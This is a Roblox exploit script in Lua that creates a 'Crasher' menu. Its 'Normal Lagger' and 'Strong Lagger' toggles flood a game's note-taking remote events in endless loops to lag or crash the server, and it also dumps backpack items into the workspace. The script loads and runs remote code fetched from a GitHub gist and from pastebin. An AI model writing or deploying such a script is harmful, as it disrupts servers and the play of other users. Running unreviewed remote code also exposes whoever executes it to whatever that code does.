local OrionLib = loadstring(game:HttpGet(("https://gist.githubusercontent.com/bobowawahahahbobobwahahawoaowabobwabo/0f40c789be5b5c65e76774be646d45aa/raw/ef4afbb2a028c6033bc3ca16f93118988e3f3a1f/illstealthis_thankyou")))()
local Window = OrionLib:MakeWindow({Name = "Crasher", HidePremium = false, SaveConfig = true, ConfigFolder = "Balls"})


local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Server = Window:MakeTab({
	Name = "Server",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

getgenv().harder = false  -- fart
getgenv().lag = false     -- default toggle
local text = ""

local Stepped = game.RunService.Stepped

function fart()
Stepped:Connect(function()
        while getgenv().Normal do
            task.wait()
            local args = {
               [1] = text,
               [2] = Enum.Font.PatrickHand,
               [3] = "\255"
            }
            
            game:GetService("ReplicatedStorage").COM.Game.RequestTakeNote:InvokeServer(unpack(args))
            for i,v in  pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
                v.Parent = game.Workspace    
            end
        end
    end)
end

function harder()
    Stepped:Connect(function()
       while getgenv().Strong do
            task.wait()
        	 local args = {
                       [1] = text,
                       [2] = Enum.Font.PatrickHand,
                       [3] = "\255"
                    }
                    
                    game:GetService("ReplicatedStorage").COM.Game.RequestTakeNote:InvokeServer(unpack(args))
    	        wait()
        	local v1 = "Drop"
        	local event = game:GetService("Players").LocalPlayer.Character.Note.ClassEvent
        	event:FireServer(v1)
       end
   end)
end	
	

Tab:AddToggle({
	Name = "Normal Lagger",
	Default = false,
	Callback = function(Value)
	    getgenv().Normal = Value
	    fart()
	end    
})

Tab:AddToggle({
	Name = "Strong Lagger",
	Default = false,
	Callback = function(Value)
	    getgenv().Strong = Value
	    harder()
	end    
})

Server:AddButton({
	Name = "ServerHop",
	Default = false,
    	Callback = function(Value)
local module = loadstring(game:HttpGet"https://pastebin.com/raw/eeF0P92L")()
module:Teleport(game.PlaceId)
	end    
})
Server:AddButton({
	Name = "Rejoin",
	Default = false,
    	Callback = function(Value)
game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId,game.JobId,game:GetService'Players'.LocalPlayer)
	end    
})
